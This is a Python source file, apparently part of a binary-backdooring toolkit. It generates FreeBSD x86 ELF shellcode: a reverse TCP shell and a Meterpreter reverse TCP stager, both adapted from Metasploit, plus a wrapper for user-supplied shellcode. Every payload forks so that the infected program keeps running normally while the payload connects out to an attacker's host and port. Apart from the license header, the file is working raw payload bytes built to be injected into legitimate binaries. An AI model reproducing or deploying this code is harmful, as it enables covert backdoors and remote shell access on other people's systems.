'''

Copyright (c) 2013-2014, Joshua Pitts
All rights reserved.

Redistribution and use in source and binary forms, with or without modification,
are permitted provided that the following conditions are met:

    1. Redistributions of source code must retain the above copyright notice,
    this list of conditions and the following disclaimer.

    2. Redistributions in binary form must reproduce the above copyright notice,
    this list of conditions and the following disclaimer in the documentation
    and/or other materials provided with the distribution.

    3. Neither the name of the copyright holder nor the names of its contributors
    may be used to endorse or promote products derived from this software without
    specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
POSSIBILITY OF SUCH DAMAGE.

'''

import struct
import sys


class freebsd_elfI32_shellcode():
    """
    FreeBSDELF Intel x32 shellcode class
    """

    def __init__(self, HOST, PORT, e_entry, SUPPLIED_SHELLCODE=None):
        #could take this out HOST/PORT and put into each shellcode function
        self.HOST = HOST
        self.PORT = PORT
        self.e_entry = e_entry
        self.SUPPLIED_SHELLCODE = SUPPLIED_SHELLCODE
        self.shellcode = ""

    def pack_ip_addresses(self):
        hostocts = []
        if self.HOST is None:
            print "This shellcode requires a HOST parameter -H"
            return False
        for i, octet in enumerate(self.HOST.split('.')):
                hostocts.append(int(octet))
        self.hostip = struct.pack('=BBBB', hostocts[0], hostocts[1],
                                  hostocts[2], hostocts[3])
        return self.hostip

    def returnshellcode(self):
        return self.shellcode

    def reverse_shell_tcp(self, CavesPicked={}):
        """
        Modified metasploit payload/bsd/x86/shell_reverse_tcp
        to correctly fork the shellcode payload and contiue normal execution.
        """
        if self.PORT is None:
            print ("Must provide port")
            return False

        self.shellcode1 = "\x52"        # push edx
        self.shellcode1 += "\x31\xC0"   # xor eax, eax
        self.shellcode1 += "\xB0\x02"   # mov al, 2
        self.shellcode1 += "\xCD\x80"   # int 80
        self.shellcode1 += "\x5A"       # pop edx
        self.shellcode1 += "\x85\xc0\x74\x07"
        self.shellcode1 += "\xbd"
        #JMP to e_entry
        self.shellcode1 += struct.pack("<I", self.e_entry)
        self.shellcode1 += "\xff\xe5"
        #BEGIN EXTERNAL SHELLCODE
        self.shellcode1 += "\x68"
        self.shellcode1 += self.pack_ip_addresses()
        self.shellcode1 += "\x68\xff\x02"
        self.shellcode1 += struct.pack('!H', self.PORT)
        self.shellcode1 += ("\x89\xe7\x31\xc0\x50"
                            "\x6a\x01\x6a\x02\x6a\x10\xb0\x61\xcd\x80\x57\x50\x50\x6a\x62"
                            "\x58\xcd\x80\x50\x6a\x5a\x58\xcd\x80\xff\x4f\xe8\x79\xf6\x68"
                            "\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x50"
                            "\xb0\x3b\xcd\x80")
        self.shellcode = self.shellcode1
        return (self.shellcode1)

    def reverse_tcp_stager(self, CavesPicked={}):
        """
        FOR USE WITH STAGER TCP PAYLOADS INCLUDING METERPRETER
        Modified from metasploit payload/bsd/x86/shell/reverse_tcp
        to correctly fork the shellcode payload and continue normal execution.
        """
        if self.PORT is None:
            print ("Must provide port")
            return False
        #FORK SHELLCODE
        self.shellcode1 = "\x52"        # push edx
        self.shellcode1 += "\x31\xC0"   # xor eax, eax
        self.shellcode1 += "\xB0\x02"   # mov al, 2
        self.shellcode1 += "\xCD\x80"   # int 80
        self.shellcode1 += "\x5A"       # pop edx
        self.shellcode1 += "\x85\xc0\x74\x07"
        self.shellcode1 += "\xbd"
        self.shellcode1 += struct.pack("<I", self.e_entry)
        self.shellcode1 += "\xff\xe5"
        #EXTERNAL SHELLCODE
        self.shellcode1 += "\x6a\x61\x58\x99\x52\x42\x52\x42\x52\x68"
        self.shellcode1 += self.pack_ip_addresses()
        self.shellcode1 += "\xcd\x80\x68\x10\x02"
        self.shellcode1 += struct.pack('!H', self.PORT)
        self.shellcode1 += ("\x89\xe1\x6a\x10\x51\x50\x51\x97\x6a\x62\x58\xcd\x80"
                            "\xb0\x03\xc6\x41\xfd\x10\xcd\x80\xc3")
        self.shellcode = self.shellcode1
        return (self.shellcode1)

    def user_supplied_shellcode(self, CavesPicked={}):
        """
        For position independent shellcode from the user
        """
        if self.SUPPLIED_SHELLCODE is None:
            print "[!] User must provide shellcode for this module (-U)"
            return False
        else:
            supplied_shellcode = open(self.SUPPLIED_SHELLCODE, 'r+b').read()

        #FORK SHELLCODE
        self.shellcode1 = "\x52"        # push edx
        self.shellcode1 += "\x31\xC0"   # xor eax, eax
        self.shellcode1 += "\xB0\x02"   # mov al, 2
        self.shellcode1 += "\xCD\x80"   # int 80
        self.shellcode1 += "\x5A"       # pop edx
        self.shellcode1 += "\x85\xc0\x74\x07"
        self.shellcode1 += "\xbd"
        self.shellcode1 += struct.pack("<I", self.e_entry)
        self.shellcode1 += "\xff\xe5"
        self.shellcode1 += supplied_shellcode

        self.shellcode = self.shellcode1
        return (self.shellcode1)
